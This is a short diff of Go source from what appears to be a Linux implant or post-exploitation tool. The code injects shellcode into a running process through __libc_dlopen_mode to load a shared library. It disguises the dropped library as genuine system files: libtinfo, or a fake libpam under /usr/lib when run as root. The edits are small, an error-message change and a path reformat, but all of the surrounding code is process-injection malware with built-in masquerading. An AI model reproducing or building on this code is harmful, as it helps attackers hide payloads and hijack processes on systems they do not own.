@@ -262,7 +262,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 func injectSOWorker(so_path string, pid int) (err error) {
 	dlopen_addr := GetSymFromLibc(pid, "__libc_dlopen_mode")
 	if dlopen_addr == 0 {
-		return fmt.Errorf("failed to get __libc_dlopen_mode address")
+		return fmt.Errorf("failed to get __libc_dlopen_mode address for %d", pid)
 	}
 	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
 	if len(shellcode) == 0 {
@@ -292,7 +292,8 @@ func GDBInjectSO(pid int) error {
 }
 
 func prepare_injectSO(pid int) (so_path string, err error) {
-	so_path = fmt.Sprintf("%s/libtinfo.so.2.1.%d", RuntimeConfig.UtilsPath, util.RandInt(0, 30))
+	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
+		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
 		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 		so_path = root_so_path
